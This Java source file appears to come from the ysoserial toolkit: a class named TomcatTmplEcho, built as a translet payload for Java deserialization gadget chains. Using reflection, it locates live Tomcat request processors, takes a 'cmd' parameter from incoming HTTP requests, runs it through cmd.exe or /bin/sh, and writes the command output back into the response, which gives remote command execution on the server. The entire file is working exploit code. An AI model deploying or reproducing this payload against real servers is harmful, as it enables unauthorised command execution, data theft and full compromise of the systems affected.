package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.Response;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;

public class TomcatTmplEcho extends AbstractTranslet {
    public Object getMBeanDomainTb() throws Exception {
        javax.management.MBeanServer mBeanServer = org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();
        Object mbsInterceptor = getFV(mBeanServer, "mbsInterceptor");
        Object repository = getFV(mbsInterceptor, "repository");
        Object domainTb = getFV(repository, "domainTb");
        return domainTb;
    }

    public Object getMBeanProcessors() throws Exception {
        HashMap domainTb = (HashMap) getMBeanDomainTb();
        HashMap hashMap = (HashMap) (domainTb.get("Tomcat") != null ? domainTb.get("Tomcat") : domainTb.get("Catalina"));//内嵌为Tomcat
        java.util.Iterator it1 = hashMap.keySet().iterator();
        while (it1.hasNext()) {
            String key = (String) it1.next();
            if (key.indexOf("name=") != -1 && key.indexOf("type=GlobalRequestProcessor") != -1) {
                Object obj = hashMap.get(key);
                Object object = getFV(obj, "object");
                Object resource = getFV(object, "resource");
                Object processors = getFV(resource, "processors");
                return processors;
            }
        }
        return null;
    }

    public Object getThreadProcessors() throws Exception {
        try {
            boolean var4 = false;
            Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");

            for (int var6 = 0; var6 < var5.length; ++var6) {
                Thread var7 = var5[var6];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var13) {
                                continue;
                            }

                            Object var9 = getFV(var1, "processors");
                            return var9;
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public TomcatTmplEcho() throws Exception {
        ArrayList processors = (ArrayList) getMBeanProcessors();
        processors = processors != null ? processors : (ArrayList) getThreadProcessors();
        for (int i = 0; i < processors.size(); ++i) {
            Request request = (Request) getFV(processors.get(i),"req");
            String var3 = request.getParameters().getParameter("cmd");
            System.out.println(var3);
            if (var3 != null && !var3.isEmpty()) {
                Response response = request.getResponse();
                String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var3} : new String[]{"/bin/sh", "-c", var3};
                writeBody(response, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                break;
            }
        }
    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }
    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();
        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }
        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
